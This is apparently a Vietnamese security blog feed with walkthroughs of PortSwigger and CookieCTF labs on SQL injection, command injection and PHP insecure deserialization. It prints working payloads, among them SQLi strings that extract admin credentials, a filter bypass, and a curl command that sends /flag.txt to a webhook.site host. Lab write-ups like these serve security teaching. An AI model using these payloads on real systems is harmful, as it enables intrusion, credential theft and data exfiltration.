<p>Để hiển thị đầy đủ mọi thứ trong cơ sở dữ liệu:</p>
<p><code>?category=Acesssories' or '1'='1' --'</code></p>
<p>Chuỗi truy vấn lúc này sẽ là:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span></code></pre></div><p>Với truy vấn trên, nó sẽ trả về tất cả các sản phẩm khi <code>Category</code> là <code>Accessories</code> hoặc <code>1 = 1</code> , vì <code>1 = 1</code> luôn đúng nên nó sẽ trả về tất cả các sản phẩm.</p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="2-sql-injection-vulnerability-allowing-login-bypass">2. SQL injection vulnerability allowing login bypass</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: APPRENTICE</p>
<h3 id="description-1">Description</h3>
<p>Lab này chứa lỗ hổng SQL Injection trong chức năng đăng nhập.</p>
<p>Để giải quyết bài lab, thực hiện một cuộc tấn công SQLi để đăng nhập vào ứng dụng với tư cách là <code>administrator</code>.</p>
<h3 id="step-1">Step</h3>
<p>Đầu tiên ấn vào <code>My account</code> để vào giao diện <code>login</code>
Thử đăng nhập với tài khoản <code>administrator</code> và mật khẩu bất kỳ.</p>
<p></p>
<p>Khi đăng nhập, câu truy vấn sẽ có dạng:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
</span></span></code></pre></div><p>Tiếp theo ta thử thêm 1 dấu <code>'</code> vào cuối <code>administrator</code> và đăng nhập.</p>
<p></p>
<p>Server sẽ bị lỗi, điều này cho thấy server bị lỗi SQL Injection.
Nếu ta tiêm vào <code>username</code> câu lệnh: <code>administrator' or '1' = '1' --</code>
Câu truy vấn sẽ có dạng:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">--</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>Bất kể mật khảu của tài khoản <code>administrator</code> có đúng hay không, vì <code>1 = 1</code> sẽ luôn trả về <code>true</code> và dấu <code>--</code> sẽ <code>comment</code> phần còn lại của câu lệnh <code>' AND password = 'password'</code> nên nó sẽ đăng nhập vào tài khoản <code>administrator</code>.</p>
<p></p>
<p>Đăng nhập thành công.
Solved</p>
<p></p>
<h2 id="3-sql-injection-attack-querying-the-database-type-and-version-on-oracle">3. SQL injection attack, querying the database type and version on Oracle</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-2">Description</h3>
<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
<h3 id="step-2">Step</h3>
<p>Trong Oracle, built-in table có tên là <code>dual</code>, do vậy, ta có thể dò cột bằng cách sử dụng <code>UNION SELECT</code> và gọi <code>FROM</code> đến bảng <code>dual</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p>Lặp đi lặp lại câu lệnh, mỗi lần tăng số lượng <code>null</code>.
Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <code>' UNION (select null, null)--</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p></p>
<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,banner FROM v$version --'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#a6e22e">banner</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">v</span>$version <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span></code></pre></div><p></p>
<p>Solved</p>
<p></p>
<h2 id="4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-3">Description</h3>
<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
<h3 id="step-3">Step</h3>
<p>Lab này tương tự như lab về <a href="#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle" rel="">Oracle Datable</a>
 nhưng sử dụng MySQL Database.
Đầu tiên ta cũng dự đoán số cột tương tự <a href="#step-2" rel="">lab 3</a>
 .
Database lần này cũng gồm 2 cột sau khi thử: <code>Accessories' UNION SELECT NULL,NULL --'</code></p>
<p></p>
<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,@@version --'</code></p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-4">Description</h3>
<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Tuy vậy, ta chưa biết database loại nào mà chỉ biết nó không phải là Oracle mà thôi.</p>
<h3 id="step-4">Step</h3>
<p>Đầu tiên, ta sẽ dò số cột trong database:</p>
<p></p>
<p>Như vậy ta đã biết trong database có 2 cột.
Thử một số cách kiểm tra <code>version</code> của database ta có thể biết được server dụng <code>PostgreSQL</code>.</p>
<p>
</p>
<p>Ta sử dụng payload này để kiểm tra tên bảng có trong database: <code>' UNION SELECT NULL, table_name FROM information_schema.tables --'</code></p>
<p></p>
<p>Có 2 bảng là <code>pg_user</code> và <code>users_excods</code>
Kiểm tra lần lượt các cột trong 2 bảng này thì phát hiện ra trong bảng <code>user_excods</code> có 2 cột khả nghi.</p>
<p>Payload: <code>' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_excods' --'</code></p>
<p></p>
<p>Kiểm tra 2 cột, ta biết được tài khoản/mật khẩu của <code>administrator</code>.</p>
<p>Payload: <code>' UNION SELECT username_tjzvcx, password_ligkez FROM users_excods --'</code></p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="6-sql-injection-attack-listing-the-database-contents-on-oracle">6. SQL injection attack, listing the database contents on Oracle</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-5">Description</h3>
<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Sử dụng Oracle Database.</p>
<h3 id="step-5">Step</h3>
<p>Giống với <a href="#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" rel="">lab 5</a>
 ở trên nên mình sẽ làm tương tự.</p>
<p>Payload: <code>' UNION SELECT NULL, table_name from all_tables --'</code></p>
<p></p>
<p></p>
<p>Tìm được bảng có tên <code>USERS_JBIWMO</code>.
Tiếp tục tìm kiếm các cột có trong bảng <code>USERS_JBIWMO</code></p>
<p></p>
<p>Ta tìm được tài khoản/mật khẩu của <code>administrator</code> với payload:</p>
<p>Payload: <code>' UNION SELECT USERNAME_EYKUIK, PASSWORD_ISAXTU FROM USERS_JBIWMO --'</code>
</p>
<p>Solved</p>
<p></p>
<h2 id="7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-6">Description</h3>
<p>Bài lab yêu cầu ta xác định số cột của bảng bằng cách sử dụng SQL injection UNION attack.</p>
<h3 id="step-6">Step</h3>
<p>Tương tự cách xác định cột tại <a href="#step-3" rel="">đây</a>
.</p>
<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="8-sql-injection-union-attack-finding-a-column-containing-text">8. SQL injection UNION attack, finding a column containing text</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-7">Description</h3>
<p>Bài lab yêu cầu ta tìm chuỗi dữ liệu cho trước <code>64fl9W</code> bằng cách sử dụng SQL injection UNION attack.</p>
<h3 id="step-7">Step</h3>
<p>Đầu tiên ta cũng <a href="#step-3" rel="">xác định số cột của bảng</a>
.</p>
<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
<p></p>
<p>Với UNION Attack, ta có thể tìm một cột chưa giá trị loại <code>string</code> bằng cách thử chèn đoạn <code>string</code> cần tìm vào:</p>
<p>Payload: <code>' UNION SELECT NULL, '64fl9W' ,NULL --'</code></p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="9-sql-injection-union-attack-retrieving-data-from-other-tables">9. SQL injection UNION attack, retrieving data from other tables</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-8">Description</h3>
<h3 id="step-8">Step</h3>
<h2 id="10-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">10. SQL injection UNION attack, retrieving multiple values in a single column</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: APPRENTICE</p>
<h3 id="description-9">Description</h3>
<h3 id="step-9">Step</h3>
<h2 id="11-blind-sql-injection-with-conditional-responses">11. Blind SQL injection with conditional responses</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-10">Description</h3>
<h3 id="step-10">Step</h3>
<h2 id="12-blind-sql-injection-with-conditional-errors">12. Blind SQL injection with conditional errors</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-11">Description</h3>
<h3 id="step-11">Step</h3>
<h2 id="13">13.</h2>
<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
</p>
<p>Level: PRACTITIONER</p>
<h3 id="description-12">Description</h3>
<h3 id="step-12">Step</h3>
]]></description>
</item>
<item>
    <title>CookieCTF - Baby Crawler</title>
    <link>https://g03m0n.github.io/posts/cookiectf--baby-crawler/</link>
    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cookiectf--baby-crawler/</guid>
    <description><![CDATA[<h2 id="description">Description</h2>
<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-crawler" target="_blank" rel="noopener noreffer">đây</a>
</p>
<h2 id="step">Step</h2>
<p>Đây là giao diện chính của challenge:</p>
<p></p>
<p>Ở challenge này, khi ấn vào nút <code>CRAWL</code> trang web sẽ hiển thị một đường link <code>Cached File</code></p>
<p></p>
<p>Khi click vào đường link ta sẽ thấy <code>html</code> của trang web</p>
<p></p>
<p>Quay trở lại giao diện chính, kiểm tra source code thì phát hiện 1 endpoint <code>?debug</code></p>
<p></p>
<p>Kiểm tra thì thấy được đoạn code chạy ở server-side. Chú ý vào đoạn code này:</p>
<p></p>
<p>Đoạn code sẽ kiểm tra url người dung nhập vào có sử dụng HTTP/HTTPS hay không, nếu có website sẽ <code>crawl</code> web bằng lệnh <code>curl</code>, sau đó lưu nội dung <code>crawl</code> được vào một file nằm trong thư mục <code>./cache</code>.
Vì có hàm <code>shell_exec</code> nên đây có thể là một lỗi Command Injection. Ở đây hàm <code>escapeshellcmd</code> được dùng để chặn các ký tự  <code>&amp;#;``|*?~&lt;&gt;^()[]{}$\</code>, <code>\x0A</code> và <code>\xFF</code> từ <code>url</code> người dùng nhập vào.</p>
<p></p>
<p>Vì vậy ta không thể bypass được challenge này theo hướng sử dụng các ký tự <code>;</code> hay <code>&amp;</code>, bắt buộc phải đi theo một hướng khác.
Thay vì <code>inject</code> một câu lệnh để server thực hiện sau khi đã thực hiện lệnh <code>curl</code>, ta có thể tận dụng trực tiếp câu lệnh <code>curl</code> để gửi nội dung của file tới một server do ta tự dựng lên với option <code>-F</code>.</p>
<p>Mình sẽ sử dụng <a href="https://webhook.site" target="_blank" rel="noopener noreffer">webhook.site</a>
 để làm server nhận file gửi đến.</p>
<p></p>
<p>Payload:
<code>http://18.142.90.137:31315/ -F file=@/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
<p></p>
<p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
]]></description>
</item>
<item>
    <title>CookieCTF - Baby SQLite With Filter</title>
    <link>https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/</link>
    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/cookiectf--baby-sqlite-with-filter/</guid>
    <description><![CDATA[<h2 id="description">Description</h2>
<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-sqlite-with-filter" target="_blank" rel="noopener noreffer">đây</a>
</p>
<blockquote>
<p>You cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = &lsquo;[&rsquo;, &lsquo;]&rsquo;, &lsquo;,&rsquo;, &lsquo;admin&rsquo;, &lsquo;select&rsquo;, &lsquo;&rsquo;&rsquo;, &lsquo;&quot;&rsquo;, &lsquo;\t&rsquo;, &lsquo;\n&rsquo;, &lsquo;\r&rsquo;, &lsquo;\x08&rsquo;, &lsquo;\x09&rsquo;, &lsquo;\x00&rsquo;, &lsquo;\x0b&rsquo;, &lsquo;\x0d&rsquo;, &rsquo; &lsquo;.
<strong>The vulnerable parameter is &rsquo;level&rsquo; in Login function.</strong></p>
</blockquote>
<h2 id="step">Step</h2>
<p>Đây là giao diện chính của challenge:</p>
<p></p>
<p>Tiến hành đọc source code:</p>
<pre tabindex="0"><code>#!/usr/bin/env python3
from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
import urllib
import os
import sqlite3

app = Flask(__name__)
app.secret_key = os.urandom(32)
from flask import _app_ctx_stack

DATABASE = &#39;users.db&#39;

def get_db():
    top = _app_ctx_stack.top
    if not hasattr(top, &#39;sqlite_db&#39;):
        top.sqlite_db = sqlite3.connect(DATABASE)
    return top.sqlite_db


FLAG = open(&#39;/flag.txt&#39;, &#39;r&#39;).read()


@app.route(&#39;/&#39;)
def index():
    return render_template(&#39;index.jinja2&#39;)


@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    if request.method == &#39;GET&#39;:
        return render_template(&#39;login.jinja2&#39;)

    uid = request.form.get(&#39;uid&#39;, &#39;&#39;).lower()
    upw = request.form.get(&#39;upw&#39;, &#39;&#39;).lower()
    level = request.form.get(&#39;level&#39;, &#39;9&#39;).lower()

    sqli_filter = [&#39;[&#39;, &#39;]&#39;, &#39;,&#39;, &#39;admin&#39;, &#39;select&#39;, &#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;, &#39;\x08&#39;, &#39;\x09&#39;, &#39;\x00&#39;, &#39;\x0b&#39;, &#39;\x0d&#39;, &#39; &#39;]
    for x in sqli_filter:
        if uid.find(x) != -1:
            return &#39;No Hack!&#39;
        if upw.find(x) != -1:
            return &#39;No Hack!&#39;
        if level.find(x) != -1:
            return &#39;No Hack!&#39;

   
    with app.app_context():
        conn = get_db()
        query = f&#34;SELECT uid FROM users WHERE uid=&#39;{uid}&#39; and upw=&#39;{upw}&#39; and level={level};&#34;
        try:
            req = conn.execute(query)
            result = req.fetchone()

            if result is not None:
                uid = result[0]
                if uid == &#39;admin&#39;:
                    return FLAG
        except Exception as e:
            print(e)
            return &#39;Error!&#39;
    return &#39;Good!&#39;


@app.teardown_appcontext
def close_connection(exception):
    top = _app_ctx_stack.top
    if hasattr(top, &#39;sqlite_db&#39;):
        top.sqlite_db.close()


if __name__ == &#39;__main__&#39;:
    os.system(&#39;rm -rf %s&#39; % DATABASE)
    with app.app_context():
        conn = get_db()
        conn.execute(&#39;CREATE TABLE users (uid text, upw text, level integer);&#39;)
        conn.execute(&#34;INSERT INTO users VALUES (&#39;dream&#39;,&#39;cometrue&#39;, 9);&#34;)
        conn.commit()

    app.run(host=&#39;0.0.0.0&#39;, port=1337)
</code></pre><p>Có thể thấy được rằng để lấy được flag thì <code>uid</code> phải là <code>admin</code> nhưng ở trong database lại không có user nào là <code>admin</code>.
Vì vậy ta phải khiến cho chương trình hiện thị ra mỗi một cái bảng với cột uid = <code>admin</code>.</p>
<p>Thử nghiệm ở trên <a href="https://sqliteonline.com/" target="_blank" rel="noopener noreffer">SQLite Online</a>
 với câu lệnh như sau:</p>
<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw= &#39;cometrue&#39; AND level=&#39;9&#39; UNION SELECT &#39;admin&#39; AS uid;
</code></pre><p></p>
<p>Nhưng ta đã bị filter khá là nhiều ký tự, trong đó có cả <code>SELECT</code> và <code>admin</code>.</p>
<p>Trong SQLite, theo <a href="http://www.humane-assessment.com/blog/moose-custom-analyses-made-easy/#:~:text=For%20example%2C%20to%20build%20a%20parser%20for%20SQLite%2C%20you%20can%20follow%20the%20official%20abstract%20grammar.%20In%20this%20grammar%2C%20the%20selectCore%20is%20one%20of%20the%20central%20productions%20and%20the%20specification%20looks%20like%3A" target="_blank" rel="noopener noreffer">selectCore</a>
 ngoài kết hợp toán tử <code>UNION</code> với toán tử <code>SELECT</code> ta còn có thể kết hợp với toán tử <code>VALUES</code>.</p>
<p></p>
<p>Thử nghiệm:</p>
<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw=&#39;&#39; AND level=0 UNION VALUES(&#39;admin&#39;);
</code></pre><p></p>
<p>Và bypass ký tự <code>admin</code> bằng hàm <code>char()</code> có sẵn trong SQLite để ép kiểu về dạng ASCII, dùng <code>||</code> để nối chuỗi và dùng <code>/**/</code> để bypass khoảng trắng.
Payload:</p>
<pre tabindex="0"><code>uid=&amp;upw=&amp;level=0/**/union/**/values(char(97)||char(100)||char(109)||char(105)||char(110))
</code></pre><p>Flag: <code>CHH{uS1nG_5yN7@x_d149raM_f95a6d70e2d13245852f2bc2a9ec023a}</code></p>
]]></description>
</item>
<item>
    <title>PortSwigger - Insecure Deserialization</title>
    <link>https://g03m0n.github.io/posts/portswigger-insecure-deserialization/</link>
    <pubDate>Wed, 20 Dec 2023 08:29:01 &#43;0800</pubDate>
    <author>g03m0n</author>
    <guid>https://g03m0n.github.io/posts/portswigger-insecure-deserialization/</guid>
    <description><![CDATA[<blockquote>
<p>Thông thường cấu trúc của <code>Serialize Data</code> có dạng:
<code>O: strlen(object name): object name: object size: {... elements...}</code></p>
</blockquote>
<h2 id="1--modifying-serialized-objects">1.  Modifying serialized objects</h2>
<h3 id="description">Description</h3>
<blockquote>
<p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&rsquo;s account.
You can log in to your own account using the5 following credentials: wiener:peter</p>
</blockquote>
<h3 id="exploitaion">Exploitaion</h3>
<p>Challenge này yêu cầu ta thay đổi thuộc tính trên serialized objects để leo quyền lên admin.</p>
<p>Đăng nhập bằng tài khoản <code>wiener:peter</code>.</p>
<p></p>
<p>Ta thấy <code>session cookie</code> là một object <code>User</code> sau khi được serialized và base64-encode. Để ý object <code>User</code> này có thuộc tính <code>admin</code> hiện có giá trị boolean <code>0</code> tức là <code>false</code>.</p>
<p></p>
<p>Vì user này không phải <code>admin</code> → không vào được trang <code>/admin</code>.
=&gt; Ta thử thay đổi giá trị boolean ở serialized session cookie thành <code>1</code></p>
<p></p>
<p>End-code base64</p>
<p></p>
<p>Edit cookie của trang web và load lại trang:</p>
<p></p>
<p>=&gt; <code>User</code> đã đăng nhập được vào trang <code>/admin</code>
Tiến hành xóa user <code>Carlos</code>.</p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="2-modifying-serialized-data-types">2. Modifying serialized data types</h2>
<h3 id="description-1">Description</h3>
<blockquote>
<p>This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
You can log in to your own account using the following credentials: wiener:peter</p>
</blockquote>
<h3 id="exploitaion-1">Exploitaion</h3>
<p>Tương tự lab 1, session cookie cũng được serialize từ <code>User</code> object</p>
<p></p>
<p>Lần này ứng dụng authenticate user thông qua thuộc tính access_token là chuỗi kí tự dài 32 kí tự.</p>
<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;s: 32: &#34;t2blplwd06k5lr3coyxnjzy7ne355ge5&#34;;}
</code></pre><p>Tuy nhiên, theo mô tả có thể ứng dụng này sử dụng PHP loose comparison bởi operator <code>==</code> để authenticate như sau:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_SESSION)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($user[<span style="color:#e6db74">&#39;access_token&#39;</span>] <span style="color:#f92672">==</span> $access_token) {
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Authenticate successfully
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span></code></pre></div><p>Như vậy ta sẽ bypass bằng cách chỉnh <code>access_token</code> về số nguyên 0 → bypass được <code>==</code> vì 0 <code>==</code> <code>string</code> sẽ trả về <code>true</code>. Serialized object sau khi chỉnh như sau:</p>
<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;i: 0;}
</code></pre><p>Endcode base64 và edit cookie</p>
<p></p>
<p>Đăng nhập vào <code>admin</code> panel thành công và tiến hành xóa user <code>Carlos</code>.</p>
<p></p>
<p>Solved</p>
<p></p>
<h2 id="3-using-application-functionality-to-exploit-insecure-deserialization">3. Using application functionality to exploit insecure deserialization</h2>
<h3 id="description-2">Description</h3>
<blockquote>
<p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&rsquo;s home directory.
You can log in to your own account using the following credentials: wiener:peter
You also have access to a backup account: gregg:rosebud</p>
</blockquote>
<h3 id="exploitaion-2">Exploitaion</h3>
<p>Tương tự 2 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
<p></p>
<p>Lần này ứng dụng có thêm thuộc tính <code>avatar_link</code>. Mà ứng dụng này có chức năng <code>Delete account</code> =&gt; Khi ấn vào nút <code>Delete account</code> thì ứng dụng sẽ xóa cả <code>avatar</code> của người dùng.</p>
<p>Nếu ta thay đổi đường dẫn tại thuộc tính <code>avatar_link</code> thành 1 file bất kì trong hệ thống thì file đó sẽ bị delete khỏi hệ thống khi <code>Delete account</code>.</p>
<p>Chỉnh sửa <code>avatar_link</code> thành <code>/home/carlos/morale.txt</code> để tiến hành xóa file.</p>
<pre tabindex="0"><code>O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:6:&#34;wiener&#34;;s:12:&#34;access_token&#34;;s:32:&#34;bqp5e5wpdhhaz3rt0knb1u6uowozl5se&#34;;s:11:&#34;avatar_link&#34;;s:23:&#34;/home/carlos/morale.txt&#34;;}
</code></pre><p>Endcode base64 và Edit cookie.</p>
<p></p>
<p></p>
<p>Load lại trang và Solved.</p>
<p></p>
<h2 id="4-arbitrary-object-injection-in-php">4. Arbitrary object injection in PHP</h2>
<h3 id="description-3">Description</h3>
<blockquote>
<p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
You can log in to your own account using the following credentials: wiener:peter</p>
</blockquote>
<h3 id="exploitaion-3">Exploitaion</h3>
<p>Tương tự 3 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
<p>Khi ấn vào <code>view-source</code> ta thấy một đường dẫn:</p>
<p></p>
<p>Kiểm tra thử đường dẫn xem có đọc được source code không:</p>
<p></p>
<p>Không có gì phản hồi. Ta thử thêm dấu <code>~</code> vào cuối đường dẫn, ta xem được mã nguồn file <code>/libs/CustomTemplate.php</code>.</p>
<p>Mã nguồn file <code>/libs/CustomTemplate.php</code>:</p>
